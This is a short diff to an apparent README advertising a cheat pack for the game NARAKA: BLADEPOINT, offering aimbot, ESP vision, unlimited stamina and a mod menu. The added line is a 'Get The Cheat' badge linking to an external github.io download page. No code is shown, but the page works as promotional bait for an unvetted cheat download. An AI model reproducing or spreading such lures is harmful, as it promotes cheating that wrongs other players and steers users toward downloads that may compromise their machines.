@@ -4,6 +4,7 @@
 
 Fast-paced melee fights, acrobatics, and survival duels make **NARAKA: BLADEPOINT** one of the wildest battle royales out there. But what if you could tilt the arena in your favor? With the **NARAKA: BLADEPOINT cheat pack**, you get hacks like aimbot, ESP vision, unlimited stamina, and full mod menu customization. This guide breaks down the most powerful cheat tools and how they change the game.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://naraka-bladepoint-cheat.github.io/.github/)
 ---
 
 ## Product Description
